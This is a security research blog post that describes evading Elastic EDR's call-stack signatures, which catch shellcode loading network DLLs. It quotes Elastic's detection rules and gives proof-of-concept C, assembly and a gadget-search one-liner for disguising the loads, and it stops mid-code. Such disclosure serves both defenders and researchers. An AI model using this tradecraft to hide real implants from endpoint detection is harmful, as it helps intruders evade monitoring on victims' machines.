# https://offsec.almond.consulting/evading-elastic-callstack-signatures.html

<!DOCTYPE html><html lang="en" class="no-js" itemscope="" itemtype="https://schema.org/WebPage">

<body class="page-template-default page page-id-3 wp-custom-logo color-custom style-simple button-default layout-full-width header-classic header-fw minimalist-header sticky-header sticky-tb-color ab-hide subheader-both-center menu-arrow-bottom menuo-right menuo-arrows menuo-no-borders menuo-sub-active mm-vertical footer-sliding mobile-tb-center mobile-side-slide mobile-mini-mr-ll tablet-sticky mobile-header-mini mobile-sticky be-reg-2125 vc_responsive">

	<!-- mfn_hook_top --><!-- mfn_hook_top -->
	
	
	<div id="Wrapper">

		
		
		<div id="Header_wrapper" class="">

			

			<div id="Subheader"><div class="container"><div class="column one"><h1 class="title">Evading Elastic EDR's call stack signatures with call gadgets</h1></div></div></div>
		</div>

		
		<!-- mfn_hook_content_before --><!-- mfn_hook_content_before -->
<div id="Content">
	<div class="content_wrapper clearfix">

		<div class="sections_group">

			<div class="entry-content" itemprop="mainContentOfPage">

				<div class="section the_content has_content"><div class="section_wrapper"><div class="the_content_wrapper"><div class="vc_row wpb_row vc_row-fluid"><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
	<div class="wpb_text_column wpb_content_element ">
		<div class="wpb_wrapper">

<p>
  <em>
  Published on
  <abbr class="published" title="2025-11-06T13:37:00+01:00">
    Thu 06 November 2025
  </abbr>
  by
      <a href="https://offsec.almond.consulting/author/saerxcit-saerxcit.html">SAERXCIT (@SAERXCIT)</a>  </em>
</p>

<p><strong>TL;DR:</strong> Using call gadgets to insert arbitrary modules in the call stack during module load, breaking signatures used in detection rules. The code is available here: <a href="https://github.com/AlmondOffSec/LibTPLoadLib">https://github.com/AlmondOffSec/LibTPLoadLib</a>.</p>
<h2>Introduction</h2>
<p>First of all, this research and blog post would not be a thing without Elastic's policy of openness, allowing security researchers to <a href="https://github.com/elastic/protections-artifacts">see how detections work</a> and <a href="https://www.elastic.co/security-labs/the-elastic-container-project">test payloads against them</a>, so full props and thanks to them! This philosophy is drastically different from how other EDR vendors operate and allows all parties to improve.</p>
<p>The Elastic EDR relies largely on call stacks for its detection logic, providing a strong source of telemetry to base behaviour analysis on. They have released several blog posts introducing and detailing the technique such as <a href="https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks">Upping the ante</a>, <a href="https://www.elastic.co/security-labs/doubling-down-etw-callstacks">Doubling down</a>, and <a href="https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware">No more free passes</a>.</p>
<p>A strong indicator for general malicious behaviour is a sensitive operation initiated from <em>unbacked</em> memory, that is, a piece of code not coming from an executable file stored on the filesystem, but instead having been loaded at runtime in dynamically allocated virtual memory. This is the typical behaviour of shellcode. Having the capability to see what the call stack looks like when a sensitive operation happens allows Elastic to detect this kind of suspicious behaviour.</p>
<p>Let's for instance take the use-case of <em>loading a network module</em>. That is a step most C2 implants will have to take if they want to communicate with their servers, and as such Elastic developed rules to catch this. For reference, <a href="https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml">here is the rule to catch this coming from shellcode in memory</a>. Ignoring the false positive exclusions, the core of the rule is the following, looking for the presence of unbacked memory within the call stack:</p>
<div class="codehilite"><pre><span></span><code><span class="k">[library</span><span class="w"> </span><span class="k">where</span>
<span class="w">  </span><span class="n">dll</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">in</span><span class="err">~</span><span class="w"> </span><span class="err">(</span><span class="s2">"ws2_32.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"wininet.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"winhttp.dll"</span><span class="err">)</span><span class="w"> </span><span class="n">and</span>
<span class="w">  </span><span class="n">process</span><span class="p">.</span><span class="n">thread</span><span class="p">.</span><span class="n">Ext</span><span class="p">.</span><span class="n">call_stack_contains_unbacked</span><span class="w"> </span><span class="o">=</span><span class="err">= </span><span class="kc">true</span><span class="w"> </span><span class="n">and</span>
<span class="w">  </span><span class="err">(</span>
<span class="w">   </span><span class="n">process</span><span class="p">.</span><span class="n">thread</span><span class="p">.</span><span class="n">Ext</span><span class="p">.</span><span class="n">call_stack_summary</span><span class="w"> </span><span class="n">in</span>
<span class="w">                  </span><span class="err">(</span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|kernelbase.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|iphlpapi.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|winhttp.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|kernelbase.dll|wininet.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|Unbacked"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|wininet.dll|Unbacked|ntdll.dll"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|Unbacked|kernel32.dll|ntdll.dll"</span><span class="err">,</span>
<span class="w">                   </span><span class="s2">"ntdll.dll|kernelbase.dll|Unbacked|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll"</span><span class="err">)</span><span class="w"> </span><span class="n">or</span>

<span class="w">  </span><span class="n">startswith</span><span class="err">~(</span><span class="n">process</span><span class="p">.</span><span class="n">thread</span><span class="p">.</span><span class="n">Ext</span><span class="p">.</span><span class="n">call_stack_summary</span><span class="err">,</span><span class="w"> </span><span class="n">concat</span><span class="err">(</span><span class="n">concat</span><span class="err">(</span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|"</span><span class="err">,</span><span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="n">name</span><span class="err">),</span><span class="w"> </span><span class="s2">"|kernel32.dll|ntdll.dll"</span><span class="err">))</span>
<span class="w">  </span><span class="err">)</span>
</code></pre></div>

<p>As call stacks happen, obviously, in-process, they are not immune to manipulation to evade existing detection rules. Multiple techniques have been developed throughout the years to hide the fact that a sensitive operation is coming from unbacked memory. We can cite <em>call stack spoofing</em> (<a href="https://dtsec.us/2023-09-15-StackSpoofin/">Dylan Tran's 2023 post</a> is a great introduction) and <em>API proxying</em> (<a href="https://0xdarkvortex.dev/hiding-in-plainsight/">presented here by Chetan Nayak</a>).</p>
<p>In classic cat-and-mouse fashion, all these techniques introduce their own sets of IoCs, for which Elastic has developed other detection rules. For the same use-case as before, here are some rules aiming to <a href="https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_library_loaded_from_a_spoofed_call_stack.toml">detect call stack spoofing</a> and <a href="https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_library_loaded_via_a_callback_function.toml">API proxying</a>. Interestingly, all rules only focus on specific sets of libraries, most probably to reduce the false positive rate and performance footprint of the protection agent.</p>
<p>This blog post introduces a technique I thought of and PoC'd to evade Elastic's detections for shellcode loading a network module, in part by exploiting these necessary blind spots. The version tested is the latest at the time of writing: 9.2.0.</p>
<p>Note: as stated, the goal of this post is only to evade a specific detection rule for a specific use-case. As there is more than one way to ~~skin a cat~~ catch shellcode, the EDR will have many more opportunities to detect malicious behaviour throughout the lifetime of the implant, which will have to implement numerous additional evasions not to be detected.</p>
<h2>Observation</h2>
<p>Let's run the public technique as-is on an endpoint running the Elastic EDR, and observe what happens and how the rules trigger. The target rule will be the one for API proxying linked above, for which the core (false-positive exclusions removed) is:</p>
<div class="codehilite"><pre><span></span><code><span class="n">sequence</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="n">entity_id</span><span class="w"> </span>
<span class="w"> </span><span class="k">[process</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">event.action</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="s2">"start"</span><span class="k">]</span>
<span class="w"> </span><span class="k">[library</span><span class="w"> </span><span class="k">where</span><span class="w"> </span>
<span class="w"> </span><span class="err">(</span>
<span class="w">   </span><span class="err">(</span><span class="n">dll</span><span class="p">.</span><span class="n">code_signature</span><span class="p">.</span><span class="n">trusted</span><span class="w"> </span><span class="o">=</span><span class="err">= </span><span class="kc">false</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">dll</span><span class="p">.</span><span class="n">code_signature</span><span class="p">.</span><span class="n">exists</span><span class="w"> </span><span class="o">=</span><span class="err">= </span><span class="kc">false</span><span class="err">))</span><span class="w"> </span><span class="n">or</span><span class="w"> </span>

<span class="w">   </span><span class="n">dll</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">in</span><span class="err">~</span><span class="w"> </span><span class="err">(</span><span class="s2">"vaultcli.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"wmiutils.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"taskschd.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"dnsapi.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"dsquery.dll"</span><span class="err">,</span><span class="w"> </span>
<span class="w">              </span><span class="s2">"mstask.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"mstscax.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"sqlite3.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"clr.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"coreclr.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"ws2_32.dll"</span><span class="err">,</span><span class="w"> </span>
<span class="w">              </span><span class="s2">"wininet.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"dnsapi.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"winhttp.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"psapi.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"bitsproxy.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"softokn3.dll"</span><span class="err">,</span><span class="w"> </span>
<span class="w">              </span><span class="s2">"System.Management.Automation.dll"</span><span class="err">,</span><span class="w"> </span><span class="s2">"Wldap32.dll"</span><span class="err">)</span>
<span class="w"> </span><span class="err">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span>

<span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="n">thread</span><span class="p">.</span><span class="n">Ext</span><span class="p">.</span><span class="n">call_stack_summary</span><span class="w"> </span><span class="n">in</span><span class="w"> </span>
<span class="w">                </span><span class="err">(</span><span class="s2">"ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll"</span><span class="err">,</span><span class="w"> </span>
<span class="w">                 </span><span class="s2">"ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll"</span><span class="err">)</span><span class="w"> </span><span class="n">and</span>
</code></pre></div>

<p>The focus here is on the call stack signature <code>"ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll"</code>.</p>
<p>I will be running a modified version of the PoC provided by Chetan Nayak in <a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/">Hiding in PlainSight part 1</a>, though for our purposes it will behave the same. The goal of the modifications is to allow compilation as a shared library to be used with Raphael Mudge's <a href="https://tradecraftgarden.org/crystalpalace.html">Crystal Palace</a>:</p>
<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_JUMP_LOADLIBRARY1</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">LPSTR</span><span class="w"> </span><span class="n">LibraryName</span><span class="p">;</span>
<span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">pLoadLibraryAddress</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="n">JUMP_LOADLIBRARY1</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">PJUMP_LOADLIBRARY1</span><span class="p">;</span>

<span class="n">HMODULE</span><span class="w"> </span><span class="nf">TpLoadLib</span><span class="p">(</span><span class="w"> </span><span class="n">CHAR</span><span class="o">*</span><span class="w"> </span><span class="n">libName</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="n">PTP_WORK</span><span class="w"> </span><span class="n">WorkReturn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="n">JUMP_LOADLIBRARY1</span><span class="w"> </span><span class="n">Params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>

<span class="w">    </span><span class="n">Params</span><span class="p">.</span><span class="n">LibraryName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libName</span><span class="p">;</span>
<span class="w">    </span><span class="n">Params</span><span class="p">.</span><span class="n">pLoadLibraryAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KERNEL32$LoadLibraryA</span><span class="p">;</span>

<span class="w">    </span><span class="n">NTDLL$TpAllocWork</span><span class="p">(</span><span class="o">&amp;</span><span class="n">WorkReturn</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PTP_WORK_CALLBACK</span><span class="p">)</span><span class="n">WorkCallback</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Params</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpPostWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpWaitForWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpReleaseWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KERNEL32$GetModuleHandleA</span><span class="p">(</span><span class="n">libName</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>

<p>This is extremely similar to what Daniel Duggan did in <a href="https://github.com/rasta-mouse/LibTP">LibTP</a>, but simplified to only fill the use-case of calling <code>LoadLibraryA</code>.</p>
<p>And the associated assembly stub:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="p">((</span><span class="kr">naked</span><span class="p">))</span><span class="w"> </span><span class="n">WorkCallback</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">__asm__</span><span class="w"> </span><span class="n">__volatile__</span><span class="w"> </span><span class="p">(</span>
<span class="w">        </span><span class="s">".intel_syntax noprefix;"</span><span class="w">   </span>
<span class="w">        </span><span class="s">"mov rcx, [rdx];"</span><span class="w">       </span><span class="c1">// Put LibraryName into rcx, first agument to LoadLibraryA</span>
<span class="w">        </span><span class="s">"mov rax, [rdx + 0x8];"</span><span class="w"> </span><span class="c1">// Prepare jump target (address to LoadLibraryA)</span>
<span class="w">        </span><span class="s">"xor rdx, rdx;"</span><span class="w">         </span><span class="c1">// Null out rdx (second argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)</span>
<span class="w">        </span><span class="s">"xor r8, r8;"</span><span class="w">           </span><span class="c1">// Null out r8 (third argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)</span>
<span class="w">        </span><span class="s">"jmp rax;"</span><span class="w">              </span><span class="c1">// Jmp to LoadLibraryA</span>
<span class="w">        </span><span class="s">".att_syntax prefix;"</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>We'll make a very simple COFF calling this function (code below) and link it using Crystal Palace and a slightly modified version of the <a href="https://tradecraftgarden.org/simplepic.html">Simple PIC spec file</a>, merging in the <code>TpLoadLib</code> shared library.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">"../src/tploadlib.h"</span>

<span class="n">WINBASEAPI</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">MSVCRT$printf</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
<span class="n">WINBASEAPI</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">MSVCRT$getchar</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">go</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">libName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"wininet"</span><span class="p">;</span>
<span class="w">    </span><span class="n">MSVCRT$printf</span><span class="p">(</span><span class="s">"%s: 0x%p</span><span class="se">\n</span><span class="s">Press Enter to exit...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">libName</span><span class="p">,</span><span class="w"> </span><span class="n">TpLoadLib</span><span class="p">(</span><span class="n">libName</span><span class="p">));</span>
<span class="w">    </span><span class="n">MSVCRT$getchar</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>Load it using any basic shellcode loader (you'll need a slight delay in your loader to avoid Elastic's emulation analysis). As expected, the detection triggers and our process is killed:</p>
<p><img alt="Running the public PoC, alert generated" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_1_run.png"></p>
<p>Running this in a debugger, when breaking on the correct call of <code>NtMapViewOfSection</code> (the syscall that will end up generating the kernel telemetry Elastic uses for this detection), we can see what the call stack looks like:</p>
<p><img alt="Call stack matching the detection rule" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_2_callstack.png"></p>
<p>This call stack is pretty self-explanatory:</p>
<ul>
<li>
<p>NTDLL into Kernel32 for the normal thread initialisation routine;</p>
</li>
<li>
<p>into the thread's entry point: NTDLL's Thread Pool functions (as this technique is using the Thread Pool API);</p>
</li>
<li>
<p>into our registered callback: <code>LoadLibraryA</code> in KernelBase;</p>
</li>
<li>
<p>into NTDLL's internal implementation of <code>LdrLoadDll</code>.</p>
</li>
</ul>
<p>Walking the modules in reverse, we find the exact signature that Elastic looks for, explaining the detection. Stepping over the <code>syscall</code> instruction, the alert will trigger:</p>
<p><img alt="Detection in debugger" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_3_debugger.png"></p>
<h2>Reflection</h2>
<p>This is a smart rule to catch loading a DLL using a callback function. Generic enough to probably not be limited to the Thread Pool APIs, while not having too many false positive exclusions. How could we avoid having this flagged signature in the call stack? As said previously, using a different callback API could lead to the same signature, as the rule does not rely on Thread Pool functions specifically.</p>
<p>Another solution would be to insert a different module somewhere in the call stack. That would theoretically work, as the signature would be broken.</p>
<p>Going back to the basics, an entry is added to the call stack when a <code>call</code> assembly instruction is executed by the CPU. This instruction pushes the address of instruction after the <code>call</code> on the stack (the <em>return address</em>), and jumps to the address pointed by the <code>call</code>. The call stack is simply a list of these return addresses, with the position of each of these addresses in the stack computed using the module's unwind info located in its <code>.pdata</code> section.</p>
<p>So logically, if we manage to find a controllable <code>call</code> instruction in a different module and jump to it, an address within that module will be stored in the call stack, breaking the flagged signature. We also need a <code>ret</code> instruction not too far from the <code>call</code>, to take back control of the execution and not let RIP wander off, most probably ending in a crash.</p>
<p>We now need to find a module containing such a sequence. Since we need to find the gadget in a module other than KernelBase and NTDLL (as the call stack signature would be the same), we will have to load it at runtime. This is a bit of a chicken-and-egg problem: in order to load a DLL without triggering a detection, we first need to load a DLL. However, as we saw before in the code of the rule, this detection only happens on a specific set of modules (or one with an invalid signature).</p>
<p>This means we just need to find this sequence in a module that does not match these checks. I'm not an exploit guy, I don't know anything about ROP, so I'll find gadgets the way I know: a loop of <code>objdump | grep</code>. I'll grab a dump of all System32 DLLs on my local Windows 11 25H2 install, and run this one-liner:</p>
<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.dll<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$i</span>:<span class="p">;</span><span class="w"> </span>x86_64-w64-mingw32-objdump<span class="w"> </span>-d<span class="w"> </span><span class="nv">$i</span><span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-Ei<span class="w"> </span><span class="s1">'call +r'</span><span class="w"> </span>-A<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-Ei<span class="w"> </span><span class="s1">'ret'</span><span class="w"> </span>-B5<span class="p">;</span><span class="w"> </span>echo<span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>call_gadgets.txt
</code></pre></div>

<p>Simply put, it disassembles DLLs and looks for a <code>call</code> to a register with a <code>ret</code> within the next 5 instructions. I am limiting the search to 5 instructions to reduce the number of false positives: instructions between <code>call</code> and <code>ret</code> having potentially uncontrollable side effects. These include for instance other <code>call</code> instructions (usually to check stack cookies).</p>
<p>After manually analysing the results to filter out the false positives that will have still shown up in the output, we end up with a few candidates. For the sake of this blog post, I will be using version <code>10.0.26100.1882</code> of <code>dsdmo.dll</code>, which had a gadget that was stable across Windows versions, until it disappeared in version <code>10.0.26100.3323</code>. This file can be downloaded from the great <a href="https://winbindex.m417z.com/?file=dsdmo.dll">Winbindex</a>.</p>
<p>The output of the one-liner for this module will be:</p>
<div class="codehilite"><pre><span></span><code>dsdmo_10.0.14393.0.dll:
   18000133d:   41 ff d2                call   r10
   180001340:   33 c0                   xor    eax,eax
   180001342:   48 83 c4 28             add    rsp,0x28
   180001346:   c3                      ret

dsdmo_10.0.26100.1882.dll:
   18000133d:   41 ff d2                call   r10
   180001340:   33 c0                   xor    eax,eax
   180001342:   48 83 c4 28             add    rsp,0x28
   180001346:   c3                      ret

dsdmo_10.0.26100.3323.dll:
</code></pre></div>

<p>This is a pretty clean gadget: calls a register, then frees the stack space allocated by the function. Since we will be <code>jmp</code>ing in the middle of the function, we will need to counteract this by allocating ourselves the freed stack space.</p>
<p>Now at this point, after having identified a candidate, a good step to take is to grep its name over all detection rules, to make sure it's not already used for some other shenanigans.</p>
<h2>Action</h2>
<p>Let's modify the original code to use the gadget. Since this PoC is using an old version of the module, I will be placing it on the test machine at the root of the <code>C:</code> drive, as <code>C:\dsdmo_10.0.26100.1882.dll</code>. The new code is:</p>
<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_JUMP_LOADLIBRARY2</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">LPSTR</span><span class="w"> </span><span class="n">LibraryName</span><span class="p">;</span>
<span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">pLoadLibraryAddress</span><span class="p">;</span>
<span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">pGadgetAddress</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="n">JUMP_LOADLIBRARY2</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">PJUMP_LOADLIBRARY2</span><span class="p">;</span>

<span class="n">PVOID</span><span class="w"> </span><span class="nf">GetCallGadgetAddress</span><span class="p">(</span>
<span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">pModule</span>
<span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="n">PBYTE</span><span class="w"> </span><span class="n">pDsdmo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PBYTE</span><span class="p">)(</span><span class="n">pModule</span><span class="p">);</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1001</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="mh">0x1000</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x25000</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x41</span><span class="w">           </span><span class="o">&amp;&amp;</span><span class="w">  </span><span class="c1">// call r10</span>
<span class="w">            </span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xFF</span><span class="w">       </span><span class="o">&amp;&amp;</span><span class="w">  </span><span class="c1">// call r10</span>
<span class="w">            </span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xD2</span><span class="w">       </span><span class="o">&amp;&amp;</span><span class="w">  </span><span class="c1">// call r10</span>
<span class="w">            </span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x28</span><span class="w">       </span><span class="o">&amp;&amp;</span><span class="w">  </span><span class="c1">// add rsp,*28*</span>
<span class="w">            </span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xC3</span><span class="w">           </span><span class="c1">// *ret*</span>
<span class="w">            </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="n">pDsdmo</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="p">}</span>

<span class="n">HMODULE</span><span class="w"> </span><span class="nf">TpLoadLib</span><span class="p">(</span><span class="w"> </span><span class="n">CHAR</span><span class="o">*</span><span class="w"> </span><span class="n">libName</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="n">PTP_WORK</span><span class="w"> </span><span class="n">WorkReturn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="n">JUMP_LOADLIBRARY2</span><span class="w"> </span><span class="n">Params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">Params</span><span class="p">.</span><span class="n">LibraryName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libName</span><span class="p">;</span>
<span class="w">    </span><span class="n">Params</span><span class="p">.</span><span class="n">pLoadLibraryAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KERNEL32$LoadLibraryA</span><span class="p">;</span>

<span class="w">    </span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hDsdmo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KERNEL32$LoadLibraryA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">dsdmo_10.0.26100.1882.dll"</span><span class="p">);</span>
<span class="w">    </span><span class="n">Params</span><span class="p">.</span><span class="n">pGadgetAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCallGadgetAddress</span><span class="p">(</span><span class="n">hDsdmo</span><span class="p">);</span>

